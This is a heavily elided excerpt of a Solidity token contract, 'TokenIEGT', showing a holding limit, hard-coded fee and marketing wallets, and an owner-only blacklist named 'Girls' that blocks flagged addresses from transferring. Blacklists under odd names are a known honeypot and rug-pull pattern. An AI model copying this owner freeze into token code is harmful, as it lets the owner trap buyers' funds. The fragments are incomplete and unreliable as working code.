...
abstract contract Limit {
    ...
    function checkLimitTokenHold(address to, uint256 amount) internal view {
        if (isLimited) {
            if (_LimitHold > 0) {
                require(
                    amount + IERC20(address(this)).balanceOf(to) <= _LimitHold,
...
abstract contract Girls is Ownable {
    ...
    modifier onlyNotGirl(address user) {
        require(girlMap[user] == 0, "you are a girl");
        _;
    }

    function setGirl(address user, uint8 b) public onlyOwner {
        girlMap[user] = b;
    }

    function setGirls(address[] memory user, uint8 b) public onlyOwner {
        for (uint i = 0; i < user.length; i++) {
            setGirl(user[i], b);
        }
    }

    function isGirl(address user) public view returns (bool) {
        return girlMap[user] != 0;
    }
}
    ...
    Limit
{
    ...
    function _transfer(
        ...
        address to,
        uint256 amount
    ) internal virtual override onlyNotGirl(from) onlyNotGirl(to) {
        _autoOpenTrading();
    ...
    function _handSwap(uint256 _amount) internal lockSwap {
        ...
        if (feeMarketingAll > 0) {
            ...
            super.swapAndSend2fee(
                _feeMarketing - _tmp,
                address(0xa86797Aa05D07B93B008FB3BF29D911bA32491e8)
            );
        }
    }
...
contract TokenIEGT is Token {
        ...
        )
    {
        ...
        address _marketing = address(
            0x56f19FeCf5BCdCCE06fE303Da3c8324002745A3a
        ); // 营销钱包
